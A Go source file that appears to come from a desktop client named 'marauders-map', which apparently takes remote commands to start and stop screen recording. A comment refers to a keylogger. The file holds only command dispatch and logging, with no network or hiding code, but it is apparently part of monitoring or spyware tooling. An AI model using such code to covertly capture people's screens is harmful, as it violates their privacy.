package observer

import (
	"log"
	"marauders-map-client-desktop/internal/screen"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder         *screen.ScreenRecorder
	recordingChannel chan *screen.Screenshot
}

func (o *ScreenshotCmdObserver) execute(cmd string, data []string) {
	if cmd != "screen" {
		return
	}

	log.Println("ScreenshotCmdObserver: new action triggered")

	// This commands needs data to operate
	if len(data) <= 0 {
		return
	}

	if data[0] == "record" {
		if len(data) <= 1 {
			return
		}

		if data[1] == "start" {
			o.startRecording()
			return
		} else if data[1] == "stop" {
			o.stopRecording()
			return
		}

		return
	}
}

func (o *ScreenshotCmdObserver) startRecording() {
	o.recordingChannel = make(chan *screen.Screenshot)

	go func() {
		o.recorder.StartCapturing(o.recordingChannel)

		for {
			shot := <-o.recordingChannel
			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
		}
	}()
}

func (o *ScreenshotCmdObserver) stopRecording() {
	o.recorder.StopCapturing()
}

func NewScreenshotCmdObserver(recorder *screen.ScreenRecorder) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder: recorder,
	}
}
